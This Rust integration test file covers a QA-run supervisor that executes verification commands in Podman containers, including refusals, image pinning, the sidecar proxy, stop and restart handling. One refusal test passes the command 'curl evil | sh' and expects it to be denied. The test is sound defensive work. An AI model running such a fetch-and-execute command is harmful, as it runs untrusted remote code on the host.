//! `qa.run` and `qa.stop` of protocol 1.4 with a scripted Podman (ADR 0022, section 3; ADR 0023,
//! section 5): admission from the stored brief without a write, the intent, the run-wide sidecar,
//! the receipt, one foreground container per command, the exit evidence with the stream records,
//! the explicit stop, and the restart reconcile of a QA run no thread of the runtime holds.
#![cfg(target_os = "linux")]

use std::fs;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use contracts::{ErrorCode, ExecutionState, PROTOCOL_VERSION, Request};
use engine::{Answer, Engine, Kind, Run, Scripted};
use rusqlite::Connection;
use serde_json::{Map, Value, json};
use state::canonical::{canonical_json, object_sha256, sha256_hex};
use state::executions::{self, Execution};
use supervisor::Supervisor;

const DISPATCH: &str = "dispatch-22222222-0000-4000-8000-000000000002";
const FIXTURE: &str = concat!(
    env!("CARGO_MANIFEST_DIR"),
    "/../state/tests/fixtures/legacy_v3"
);
const WORKER_TAG: &str = "harness-worker:local";
const PROXY_TAG: &str = "harness-proxy:local";
const WORKER_PIN: &str = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
const PROXY_PIN: &str = "sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
const PROXY_ID: &str = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
const NET_ID: &str = "89abcdef0123456789abcdef0123456789abcdef0123456789abcdef01234567";

fn copy_tree(from: &Path, to: &Path) {
    fs::create_dir_all(to).unwrap();
    for entry in fs::read_dir(from).unwrap() {
        let entry = entry.unwrap();
        let target = to.join(entry.file_name());
        if entry.file_type().unwrap().is_dir() {
            copy_tree(&entry.path(), &target);
        } else {
            fs::copy(entry.path(), target).unwrap();
        }
    }
}

fn podman_info() -> String {
    json!({"host": {"hostname": "podman-host", "serviceIsRemote": false,
                    "security": {"rootless": true, "selinuxEnabled": false}},
           "version": {"Version": "5.4.0"}})
    .to_string()
}

struct Repo {
    root: PathBuf,
    git_common: PathBuf,
    engine: Arc<Scripted>,
}

fn strings(parts: &[&str]) -> Vec<String> {
    parts.iter().map(|part| (*part).to_owned()).collect()
}

impl Repo {
    fn new(name: &str, hosts: &[&str]) -> Self {
        let root = std::env::temp_dir().join(format!("hr-qa-run-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&root);
        let state = root.join(".harness/orchestration/state");
        copy_tree(Path::new(FIXTURE), &state);
        let generation = state.join("generations/generation-7a4a6d6e");
        fs::remove_file(generation.join("qa-lane/lease.json")).unwrap();
        fs::remove_file(generation.join("qa-lane/queue/00000000000000000001-dispatch.json"))
            .unwrap();
        state::migrate::run(&root).unwrap();
        let root = root.canonicalize().unwrap();
        for dir in [
            ".git",
            "worktree",
            ".harness/.sandboxes/artifacts",
            ".harness/runs/qa/run-1/checkout",
            ".harness/runs/qa/run-1/tmp",
            "cache/pip",
        ] {
            fs::create_dir_all(root.join(dir)).unwrap();
        }
        let git_common = root.join(".git");
        let base = root.clone();
        let path = move |rel: &str| base.join(rel).to_str().unwrap().to_owned();
        let mut container = json!({"engine": "podman", "worker_image": WORKER_TAG});
        if !hosts.is_empty() {
            container["proxy_image"] = json!(PROXY_TAG);
        }
        let plan = json!({
            "mode": "sandbox", "network": {"hosts": hosts}, "runtime_extension": "docker",
            "container": container,
            "requirements": [
                {"resource": "checkout", "path": path("worktree"), "access": "read"},
                {"resource": "git_common", "path": path(".git"), "access": "write"},
                {"resource": "shared_storage", "path": path(".harness"), "access": "write"},
                {"resource": "artifacts", "path": path(".harness/.sandboxes/artifacts"), "access": "write"},
                {"resource": "cache", "path": path("cache/pip"), "access": "write"},
            ],
            "plan_digest": "d".repeat(64),
        });
        let engine = Arc::new(Scripted::new(Kind::Podman));
        let repo = Self {
            root,
            git_common,
            engine,
        };
        let connection = repo.store();
        // The QA lane is held by the dispatch, with the fencing token 7.
        connection
            .execute(
                "INSERT INTO qa_lane (id, revision, fencing_token, body_json, owner_kind, owner_id,
                     acquired_at, expires_at, heartbeat_at, host, pid, start_time)
                 VALUES (1, 1, 7, '{}', 'dispatch', ?1, '2026-10-28T00:00:00+00:00',
                     '2026-10-28T01:00:00+00:00', '2026-10-28T00:00:00+00:00', 'h', 1, '1')
                 ON CONFLICT (id) DO UPDATE SET fencing_token = 7, owner_kind = 'dispatch',
                     owner_id = excluded.owner_id, acquired_at = excluded.acquired_at,
                     expires_at = excluded.expires_at, heartbeat_at = excluded.heartbeat_at,
                     host = 'h', pid = 1, start_time = '1'",
                [DISPATCH],
            )
            .unwrap();
        let body = |table: &str| -> Map<String, Value> {
            let text: String = connection
                .query_row(
                    &format!("SELECT body_json FROM {table} WHERE id = ?1"),
                    [DISPATCH],
                    |row| row.get(0),
                )
                .unwrap();
            serde_json::from_str(&text).unwrap()
        };
        let mut brief = body("dispatch");
        brief.insert("role".to_owned(), json!("qa"));
        brief.insert(
            "verification_commands".to_owned(),
            json!(["make lint", "make test", "make docs"]),
        );
        brief.insert(
            "orchestration_policy".to_owned(),
            json!({"infrastructure_retry": {"qa_preparation": ["make bootstrap"],
                   "qa_environment_probes": [], "qa_project_file_checks": []}}),
        );
        brief.insert(
            "qa_execution".to_owned(),
            json!({"supervisor": "harness-runtime", "command_timeout_seconds": 60,
                   "stop_grace_seconds": 1, "poll_interval_seconds": 1}),
        );
        brief.insert("runtime_access".to_owned(), plan);
        brief.insert(
            "runtime_images".to_owned(),
            json!({"worker": WORKER_PIN, "proxy": if hosts.is_empty() { Value::Null } else { json!(PROXY_PIN) }}),
        );
        let mut status = body("dispatch_status");
        status.insert("attempt".to_owned(), json!(1));
        for (table, record, state) in [
            ("dispatch", brief, None),
            ("dispatch_status", status, Some("working")),
        ] {
            connection
                .execute(
                    &format!(
                        "UPDATE {table} SET body_json = ?2{} WHERE id = ?1",
                        state.map_or(String::new(), |s| format!(", state = '{s}'"))
                    ),
                    [DISPATCH, &Value::Object(record).to_string()],
                )
                .unwrap();
        }
        repo.engine
            .answer(&["podman", "info"], Answer::success(podman_info()))
            .answer(
                &[
                    "podman", "image", "inspect", "--format", "{{.Id}}", WORKER_TAG,
                ],
                Answer::success(WORKER_PIN),
            )
            .answer(
                &[
                    "podman", "image", "inspect", "--format", "{{.Id}}", PROXY_TAG,
                ],
                Answer::success(PROXY_PIN),
            )
            .answer(&["podman", "network", "create"], Answer::success(NET_ID))
            .answer(&["podman", "network", "connect"], Answer::success(""))
            .answer(&["podman", "create"], Answer::success(PROXY_ID))
            .answer(&["podman", "start"], Answer::success(PROXY_ID))
            .answer(&["podman", "stop"], Answer::success(""))
            .answer(&["podman", "kill"], Answer::success(""))
            .answer(&["podman", "rm"], Answer::success(""))
            .answer(&["podman", "network", "rm"], Answer::success(""))
            .answer(&["podman", "ps"], Answer::success(""))
            .answer(&["podman", "network", "ls"], Answer::success(""));
        repo
    }

    fn path(&self, rel: &str) -> String {
        self.root.join(rel).to_str().unwrap().to_owned()
    }

    fn state(&self) -> PathBuf {
        self.root.join(".harness/orchestration/state")
    }

    fn store(&self) -> Connection {
        Connection::open(self.state().join("runtime.db")).unwrap()
    }

    fn supervisor(&self) -> Arc<Supervisor> {
        let engine = Arc::clone(&self.engine) as Arc<dyn Engine>;
        Arc::new(
            Supervisor::new(Some(self.state()))
                .with_runtime(Some(self.git_common.clone()), Vec::new())
                .with_engines(Arc::new(move |kind| {
                    assert_eq!(kind, Kind::Podman);
                    Arc::clone(&engine)
                })),
        )
    }

    fn operation_id(&self, attempt: i64) -> String {
        let (brief, _) = executions::dispatch_records(&self.store(), DISPATCH)
            .unwrap()
            .unwrap();
        sha256_hex(canonical_json(&json!([DISPATCH, object_sha256(&brief), attempt])).as_bytes())
    }

    fn token(&self) -> String {
        self.store()
            .query_row(
                "SELECT fencing_token FROM qa_lane WHERE id = 1",
                [],
                |row| row.get::<_, i64>(0),
            )
            .unwrap()
            .to_string()
    }

    fn request(&self, operation: &str, operation_id: String, payload: Value) -> Request {
        let deadline = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_millis()
            + 30_000;
        Request {
            protocol_version: PROTOCOL_VERSION,
            operation_id,
            operation: operation.to_owned(),
            request_deadline: u64::try_from(deadline).unwrap(),
            batch_id: None,
            dispatch_id: None,
            candidate_sha: None,
            plan_digest: None,
            expected_revision: None,
            fencing_token: Some(self.token()),
            payload: Some(payload),
        }
    }

    fn payload(&self, groups: &Value) -> Value {
        json!({
            "dispatch_id": DISPATCH,
            "attempt": 1,
            "run_root": self.path(".harness/runs"),
            "workdir": self.path(".harness/runs/qa/run-1/checkout"),
            "tmpdir": self.path(".harness/runs/qa/run-1/tmp"),
            "groups": groups,
        })
    }

    fn run(
        &self,
        supervisor: &Arc<Supervisor>,
        groups: &Value,
    ) -> Result<Value, contracts::ErrorBody> {
        supervisor.qa_run(&self.request("qa.run", self.operation_id(1), self.payload(groups)))
    }

    fn execution(&self) -> Option<Execution> {
        executions::of_dispatch(&self.store(), DISPATCH).unwrap()
    }

    fn wait_for(&self, supervisor: &Arc<Supervisor>, state: ExecutionState) -> Execution {
        let until = Instant::now() + Duration::from_secs(20);
        loop {
            supervisor.reconcile_all();
            let execution = self.execution().unwrap();
            if execution.state == state || Instant::now() > until {
                assert_eq!(execution.state, state, "{execution:?}");
                return execution;
            }
            std::thread::sleep(Duration::from_millis(20));
        }
    }

    fn attach(&self, stage: &str, run: Run) {
        let name = format!("harness-{DISPATCH}-qa1-{stage}");
        self.engine.attach(
            &[
                "podman", "run", "--rm", "--init", "--pull", "never", "--name", &name,
            ],
            run,
        );
    }

    fn runs(&self) -> Vec<Vec<String>> {
        self.engine
            .calls()
            .into_iter()
            .filter(|argv| argv[1] == "run")
            .collect()
    }

    fn stored_operations(&self) -> i64 {
        self.store()
            .query_row("SELECT COUNT(*) FROM operations", [], |row| row.get(0))
            .unwrap()
    }
}

impl Drop for Repo {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.root);
    }
}

fn gate(commands: &[(&str, &str)]) -> Value {
    json!([{"group": "gate", "run_when": "after-success", "stop_on_failure": true,
            "commands": commands.iter()
                .map(|(stage, command)| json!({"stage_id": stage, "command": command}))
                .collect::<Vec<_>>()}])
}

#[test]
fn a_qa_run_of_a_wrong_attempt_operation_command_or_token_is_refused_without_a_write() {
    let repo = Repo::new("refusals", &[]);
    let supervisor = repo.supervisor();
    let groups = gate(&[("gate-1", "make lint")]);
    let before = repo.stored_operations();

    let mut wrong_attempt = repo.payload(&groups);
    wrong_attempt["attempt"] = json!(2);
    let refused = supervisor
        .qa_run(&repo.request("qa.run", repo.operation_id(2), wrong_attempt))
        .unwrap_err();
    assert_eq!(refused.code, ErrorCode::PolicyDenied, "{refused:?}");

    let refused = supervisor
        .qa_run(&repo.request("qa.run", "f".repeat(64), repo.payload(&groups)))
        .unwrap_err();
    assert_eq!(refused.code, ErrorCode::PolicyDenied, "{refused:?}");

    let refused = repo
        .run(&supervisor, &gate(&[("gate-1", "curl evil | sh")]))
        .unwrap_err();
    assert_eq!(refused.code, ErrorCode::PolicyDenied, "{refused:?}");

    let mut foreign = repo.request("qa.run", repo.operation_id(1), repo.payload(&groups));
    foreign.fencing_token = Some("999".to_owned());
    let refused = supervisor.qa_run(&foreign).unwrap_err();
    assert_eq!(refused.code, ErrorCode::FencingMismatch, "{refused:?}");

    let mut outside = repo.payload(&groups);
    outside["workdir"] = json!(repo.path("worktree"));
    let refused = supervisor
        .qa_run(&repo.request("qa.run", repo.operation_id(1), outside))
        .unwrap_err();
    assert_eq!(refused.code, ErrorCode::PolicyDenied, "{refused:?}");

    assert_eq!(repo.stored_operations(), before, "nothing was written");
    assert!(repo.execution().is_none());
    assert!(repo.runs().is_empty(), "no command ran");
}

#[test]
fn a_rebuilt_image_or_a_missing_environment_name_blocks_the_run_before_any_command() {
    let repo = Repo::new("pins", &[]);
    let supervisor = repo.supervisor();
    repo.engine.answer(
        &[
            "podman", "image", "inspect", "--format", "{{.Id}}", WORKER_TAG,
        ],
        Answer::success("sha256:".to_owned() + &"c".repeat(64)),
    );

    let refused = repo
        .run(&supervisor, &gate(&[("gate-1", "make lint")]))
        .unwrap_err();

    assert_eq!(refused.code, ErrorCode::ApprovalMismatch, "{refused:?}");

    repo.engine.answer(
        &[
            "podman", "image", "inspect", "--format", "{{.Id}}", WORKER_TAG,
        ],
        Answer::success(WORKER_PIN),
    );
    repo.store()
        .execute(
            "UPDATE dispatch SET body_json = json_set(body_json, '$.runtime_access.environment',
                 json('[\"HARNESS_QA_UNSET_VARIABLE_810\"]')) WHERE id = ?1",
            [DISPATCH],
        )
        .unwrap();
    let refused = repo
        .run(&supervisor, &gate(&[("gate-1", "make lint")]))
        .unwrap_err();

    assert_eq!(refused.code, ErrorCode::PolicyDenied, "{refused:?}");
    assert!(
        refused.message.contains("HARNESS_QA_UNSET_VARIABLE_810"),
        "{refused:?}"
    );
    assert!(repo.runs().is_empty());
    assert!(repo.execution().is_none());
}

#[test]
fn every_command_runs_in_its_own_foreground_container_and_the_exit_keeps_its_evidence() {
    let repo = Repo::new("run", &[]);
    let supervisor = repo.supervisor();
    repo.attach("prep-1", Run::finish("deps\n", "", 0));
    repo.attach("gate-1", Run::finish("lint ok\n", "", 0));
    repo.attach("gate-2", Run::finish("", "1 failed\n", 1));
    let groups = json!([
        {"group": "preparation", "run_when": "always", "stop_on_failure": true,
         "commands": [{"stage_id": "prep-1", "command": "make bootstrap"}]},
        {"group": "gate", "run_when": "after-success", "stop_on_failure": true, "commands": [
            {"stage_id": "gate-1", "command": "make lint"},
            {"stage_id": "gate-2", "command": "make test"},
            {"stage_id": "gate-3", "command": "make docs"},
        ]},
    ]);

    let receipt = repo.run(&supervisor, &groups).unwrap();

    assert_eq!(
        (receipt["kind"].as_str(), receipt["attempt"].as_i64()),
        (Some("qa"), Some(1))
    );
    let exited = repo.wait_for(&supervisor, ExecutionState::Exited);
    assert_eq!((exited.kind.as_str(), exited.attempt), ("qa", 1));
    assert!(
        exited.lease_released_at.is_some(),
        "the exit releases the lease"
    );
    let exit = exited.exit.expect("exit evidence");
    let commands = exit["commands"].as_array().unwrap();
    let shown: Vec<(&str, &str, Value)> = commands
        .iter()
        .map(|item| {
            (
                item["stage_id"].as_str().unwrap(),
                item["result"].as_str().unwrap(),
                item["exit_code"].clone(),
            )
        })
        .collect();
    assert_eq!(
        shown,
        [
            ("prep-1", "ran", json!(0)),
            ("gate-1", "ran", json!(0)),
            ("gate-2", "ran", json!(1)),
            ("gate-3", "not_run", Value::Null),
        ]
    );
    let stderr = PathBuf::from(commands[2]["stderr"]["path"].as_str().unwrap());
    assert!(stderr.starts_with(repo.state().join("executions").join(&exited.id)));
    assert_eq!(fs::read_to_string(stderr).unwrap(), "1 failed\n");
    assert_eq!(exit["stopped_by"], Value::Null);

    let runs = repo.runs();
    assert_eq!(runs.len(), 3, "one container per command that ran");
    let joined = runs[1].join(" ");
    for part in [
        "--rm --init --pull never",
        "--network none",
        &format!("harness.execution={}", exited.id),
        &format!("--workdir {}", repo.path(".harness/runs/qa/run-1/checkout")),
        &format!(
            "type=bind,source={0},target={0}",
            repo.path(".harness/runs")
        ),
        &format!(
            "type=bind,source={0},target={0},readonly",
            repo.path(".git")
        ),
        &format!("type=bind,source={0},target={0}", repo.path("cache/pip")),
        &format!("TMPDIR={}", repo.path(".harness/runs/qa/run-1/tmp")),
        "HARNESS_VERIFY_COLD=1",
        &format!("--entrypoint /bin/sh {WORKER_PIN} -c make lint"),
    ] {
        assert!(joined.contains(part), "{part} not in {joined}");
    }
    for unmounted in ["worktree", ".harness/.sandboxes/artifacts"] {
        assert!(
            !joined.contains(&format!("source={},", repo.path(unmounted))),
            "{unmounted} is mounted: {joined}"
        );
    }
    assert!(!joined.contains(&format!("source={},", repo.path(".harness"))));
    for argv in repo.engine.calls() {
        assert_eq!(argv[0], "podman");
        assert!(
            !argv.iter().any(|part| part == "volume" || part == "git"),
            "{argv:?}"
        );
    }
    let teardown = repo
        .state()
        .join("executions")
        .join(&exited.id)
        .join("teardown.json");
    assert!(teardown.exists(), "the removal after the exit is recorded");
    // A repeat answers the stored receipt and never runs a command again.
    repo.engine.clear();
    assert_eq!(repo.run(&supervisor, &groups).unwrap(), receipt);
    assert!(repo.runs().is_empty());
}

#[test]
fn the_run_wide_sidecar_and_network_serve_every_command_and_go_after_the_exit() {
    let repo = Repo::new("sidecar", &["pypi.org"]);
    let supervisor = repo.supervisor();
    repo.attach("gate-1", Run::finish("", "", 0));
    repo.attach("gate-2", Run::finish("", "", 0));
    let net = format!("harness-{DISPATCH}-qa1-net");
    let proxy = format!("harness-{DISPATCH}-qa1-proxy");
    let labels = |id: &str| {
        json!({"harness.dispatch": DISPATCH, "harness.repository": repo.git_common,
               "harness.execution": id})
    };

    // The execution id is the operation id: the listing of the teardown is ready before the run.
    let id = repo.operation_id(1);
    repo.engine
        .answer(&["podman", "ps"], Answer::success(PROXY_ID))
        .answer(&["podman", "network", "ls"], Answer::success(NET_ID))
        .answer(
            &["podman", "container", "inspect"],
            Answer::success(
                json!([{"Id": PROXY_ID, "Name": format!("/{proxy}"), "State": {"Status": "running"},
                        "Config": {"Labels": labels(&id)}}])
                .to_string(),
            ),
        )
        .answer(
            &["podman", "network", "inspect"],
            Answer::success(json!([{"Id": NET_ID, "Name": net, "Labels": labels(&id)}]).to_string()),
        );
    repo.run(
        &supervisor,
        &gate(&[("gate-1", "make lint"), ("gate-2", "make test")]),
    )
    .unwrap();
    let exited = repo.wait_for(&supervisor, ExecutionState::Exited);

    let calls = repo.engine.calls();
    let count = |prefix: &[&str]| {
        calls
            .iter()
            .filter(|argv| argv.starts_with(&strings(prefix)))
            .count()
    };
    assert_eq!(count(&["podman", "network", "create"]), 1);
    assert_eq!(count(&["podman", "create"]), 1, "one sidecar for the run");
    for run in repo.runs() {
        let at = run.iter().position(|part| part == "--network").unwrap();
        assert_eq!(run[at + 1], net);
        assert!(run.contains(&format!("HTTPS_PROXY=http://{proxy}:3128")));
    }
    assert_eq!(repo.runs().len(), 2);
    let teardown: Value = serde_json::from_str(
        &fs::read_to_string(
            repo.state()
                .join("executions")
                .join(&exited.id)
                .join("teardown.json"),
        )
        .unwrap(),
    )
    .unwrap();
    assert_eq!(teardown["complete"], true, "{teardown}");
    assert!(calls.contains(&strings(&["podman", "rm", "--force", PROXY_ID])));
    assert!(calls.contains(&strings(&["podman", "network", "rm", NET_ID])));
}

#[test]
fn qa_stop_stops_the_running_command_and_every_later_command_is_not_run() {
    let repo = Repo::new("stop", &[]);
    let supervisor = repo.supervisor();
    repo.attach("gate-1", Run::until_stopped("half\n", ""));
    repo.run(
        &supervisor,
        &gate(&[("gate-1", "make test"), ("gate-2", "make docs")]),
    )
    .unwrap();
    let until = Instant::now() + Duration::from_secs(10);
    while repo.runs().is_empty() && Instant::now() < until {
        std::thread::sleep(Duration::from_millis(10));
    }

    let stopped = supervisor
        .qa_stop(&repo.request(
            "qa.stop",
            "stop-1".to_owned(),
            json!({"dispatch_id": DISPATCH, "attempt": 1}),
        ))
        .unwrap();

    assert_eq!(stopped["execution"]["attempt"], 1);
    let exited = repo.wait_for(&supervisor, ExecutionState::Exited);
    let exit = exited.exit.unwrap();
    assert_eq!(exit["stopped_by"], "command");
    assert_eq!(exit["commands"][0]["exit_code"], 143);
    assert_eq!(exit["commands"][0]["domain"], "cancelled");
    assert_eq!(exit["commands"][1]["result"], "not_run");
    let stop = repo
        .engine
        .calls()
        .into_iter()
        .find(|argv| argv[1] == "stop")
        .unwrap();
    assert_eq!(
        stop,
        strings(&[
            "podman",
            "stop",
            "--time",
            "1",
            &format!("harness-{DISPATCH}-qa1-gate-1")
        ])
    );
}

#[test]
fn a_qa_run_no_thread_of_this_runtime_holds_is_stopped_and_lost_after_a_restart() {
    let repo = Repo::new("orphan", &[]);
    let first = repo.supervisor();
    repo.attach("gate-1", Run::finish("ok\n", "", 0));
    repo.attach("gate-2", Run::until_killed("", ""));
    repo.run(
        &first,
        &gate(&[
            ("gate-1", "make lint"),
            ("gate-2", "make test"),
            ("gate-3", "make docs"),
        ]),
    )
    .unwrap();
    let until = Instant::now() + Duration::from_secs(10);
    while repo.runs().len() < 2 && Instant::now() < until {
        std::thread::sleep(Duration::from_millis(10));
    }
    let id = repo.execution().unwrap().id;
    let name = format!("harness-{DISPATCH}-qa1-gate-2");
    // The engine names the command container by its name, so its stop reaches the hanging run.
    repo.engine
        .answer(&["podman", "ps"], Answer::success(name.clone()))
        .answer(
            &["podman", "container", "inspect"],
            Answer::success(
                json!([{"Id": name, "Name": format!("/{name}"), "State": {"Status": "running"},
                        "Config": {"Labels": {"harness.dispatch": DISPATCH,
                                              "harness.repository": repo.git_common,
                                              "harness.execution": id}}}])
                .to_string(),
            ),
        );

    // A new runtime of the same store: the thread of the first one is not its own.
    let restarted = repo.supervisor();
    let lost = repo.wait_for(&restarted, ExecutionState::Lost);

    let exit = lost.exit.expect("the evidence of the commands that ran");
    let results: Vec<&str> = exit["commands"]
        .as_array()
        .unwrap()
        .iter()
        .map(|item| item["result"].as_str().unwrap())
        .collect();
    assert_eq!((results[0], results[2]), ("ran", "not_run"), "{results:?}");
    assert_eq!(exit["commands"][0]["exit_code"], 0);
    let calls = repo.engine.calls();
    assert!(calls.contains(&strings(&["podman", "stop", "--time", "1", &name])));
    assert!(calls.contains(&strings(&["podman", "kill", &name])));
    assert!(calls.contains(&strings(&["podman", "rm", &name])));
    assert!(lost.lease_released_at.is_some());
}
